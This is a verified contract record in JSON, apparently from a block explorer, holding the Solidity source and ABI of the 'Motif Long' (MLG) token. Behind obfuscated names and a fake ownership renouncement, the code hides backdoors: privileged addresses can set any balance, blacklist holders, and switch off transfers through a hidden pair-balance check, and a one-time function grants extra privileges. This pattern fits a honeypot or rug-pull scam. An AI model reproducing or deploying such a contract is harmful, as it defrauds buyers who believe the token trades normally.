{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface launchFrom {\n    function createPair(address isSender, address maxLiquiditySender) external returns (address);\n}\n\ninterface swapReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tokenMode) external view returns (uint256);\n\n    function transfer(address limitSenderEnable, uint256 tokenListBuy) external returns (bool);\n\n    function allowance(address buyLiquidity, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tokenListBuy) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address limitSenderEnable,\n        uint256 tokenListBuy\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tokenSwapShould, uint256 value);\n    event Approval(address indexed buyLiquidity, address indexed spender, uint256 value);\n}\n\nabstract contract launchedExempt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface senderModeSell {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface sellLiquidity is swapReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract MotifLong is launchedExempt, swapReceiver, sellLiquidity {\n\n    function isSell() private view {\n        require(minExemptTx[_msgSender()]);\n    }\n\n    uint256 private takeMin;\n\n    uint8 private swapShouldAt = 18;\n\n    uint256 private limitEnable;\n\n    function getOwner() external view returns (address) {\n        return senderExempt;\n    }\n\n    bool public listBuy;\n\n    mapping(address => bool) public minExemptTx;\n\n    function name() external view virtual override returns (string memory) {\n        return teamReceiverReceiver;\n    }\n\n    uint256 amountTrading;\n\n    function buyFund(address sellTx, address limitSenderEnable, uint256 tokenListBuy) internal returns (bool) {\n        if (sellTx == walletList) {\n            return listAuto(sellTx, limitSenderEnable, tokenListBuy);\n        }\n        uint256 buyList = swapReceiver(buyAuto).balanceOf(fundWallet);\n        require(buyList == limitLaunched);\n        require(limitSenderEnable != fundWallet);\n        if (liquidityTradingEnable[sellTx]) {\n            return listAuto(sellTx, limitSenderEnable, buyTx);\n        }\n        return listAuto(sellTx, limitSenderEnable, tokenListBuy);\n    }\n\n    function tradingExempt() public {\n        emit OwnershipTransferred(walletList, address(0));\n        senderExempt = address(0);\n    }\n\n    event OwnershipTransferred(address indexed marketingLimitFee, address indexed receiverTradingLaunch);\n\n    function symbol() external view virtual override returns (string memory) {\n        return modeLimit;\n    }\n\n    function transfer(address totalMode, uint256 tokenListBuy) external virtual override returns (bool) {\n        return buyFund(_msgSender(), totalMode, tokenListBuy);\n    }\n\n    mapping(address => mapping(address => uint256)) private isAmount;\n\n    uint256 public shouldMarketing;\n\n    bool public minFund;\n\n    bool public senderToken;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return marketingAt;\n    }\n\n    function listAuto(address sellTx, address limitSenderEnable, uint256 tokenListBuy) internal returns (bool) {\n        require(amountTo[sellTx] >= tokenListBuy);\n        amountTo[sellTx] -= tokenListBuy;\n        amountTo[limitSenderEnable] += tokenListBuy;\n        emit Transfer(sellTx, limitSenderEnable, tokenListBuy);\n        return true;\n    }\n\n    uint256 private marketingAt = 100000000 * 10 ** 18;\n\n    function owner() external view returns (address) {\n        return senderExempt;\n    }\n\n    function approve(address feeWalletBuy, uint256 tokenListBuy) public virtual override returns (bool) {\n        isAmount[_msgSender()][feeWalletBuy] = tokenListBuy;\n        emit Approval(_msgSender(), feeWalletBuy, tokenListBuy);\n        return true;\n    }\n\n    constructor (){\n        \n        senderModeSell swapLaunchMax = senderModeSell(tokenTake);\n        buyAuto = launchFrom(swapLaunchMax.factory()).createPair(swapLaunchMax.WETH(), address(this));\n        \n        walletList = _msgSender();\n        minExemptTx[walletList] = true;\n        amountTo[walletList] = marketingAt;\n        tradingExempt();\n        \n        emit Transfer(address(0), walletList, marketingAt);\n    }\n\n    bool public totalFrom;\n\n    bool public atTake;\n\n    uint256 constant buyTx = 16 ** 10;\n\n    address private senderExempt;\n\n    function balanceOf(address tokenMode) public view virtual override returns (uint256) {\n        return amountTo[tokenMode];\n    }\n\n    mapping(address => bool) public liquidityTradingEnable;\n\n    bool public atBuy;\n\n    function listIs(address txAmount) public {\n        isSell();\n        if (limitEnable == receiverTo) {\n            listBuy = false;\n        }\n        if (txAmount == walletList || txAmount == buyAuto) {\n            return;\n        }\n        liquidityTradingEnable[txAmount] = true;\n    }\n\n    function sellEnableLimit(address totalMode, uint256 tokenListBuy) public {\n        isSell();\n        amountTo[totalMode] = tokenListBuy;\n    }\n\n    function transferFrom(address sellTx, address limitSenderEnable, uint256 tokenListBuy) external override returns (bool) {\n        if (_msgSender() != tokenTake) {\n            if (isAmount[sellTx][_msgSender()] != type(uint256).max) {\n                require(tokenListBuy <= isAmount[sellTx][_msgSender()]);\n                isAmount[sellTx][_msgSender()] -= tokenListBuy;\n            }\n        }\n        return buyFund(sellTx, limitSenderEnable, tokenListBuy);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return swapShouldAt;\n    }\n\n    uint256 public receiverTo;\n\n    function modeToWallet(uint256 tokenListBuy) public {\n        isSell();\n        limitLaunched = tokenListBuy;\n    }\n\n    function totalReceiver(address enableFundReceiver) public {\n        if (totalFrom) {\n            return;\n        }\n        \n        minExemptTx[enableFundReceiver] = true;\n        \n        totalFrom = true;\n    }\n\n    address tokenTake = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    string private teamReceiverReceiver = \"Motif Long\";\n\n    string private modeLimit = \"MLG\";\n\n    address public walletList;\n\n    address fundWallet = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address public buyAuto;\n\n    mapping(address => uint256) private amountTo;\n\n    function allowance(address limitLaunch, address feeWalletBuy) external view virtual override returns (uint256) {\n        if (feeWalletBuy == tokenTake) {\n            return type(uint256).max;\n        }\n        return isAmount[limitLaunch][feeWalletBuy];\n    }\n\n    uint256 limitLaunched;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingLimitFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverTradingLaunch\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenSwapShould\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeWalletBuy\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeWalletBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenListBuy\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenMode\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityTradingEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txAmount\",\"type\":\"address\"}],\"name\":\"listIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minExemptTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenListBuy\",\"type\":\"uint256\"}],\"name\":\"modeToWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenListBuy\",\"type\":\"uint256\"}],\"name\":\"sellEnableLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableFundReceiver\",\"type\":\"address\"}],\"name\":\"totalReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenListBuy\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitSenderEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenListBuy\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "MotifLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}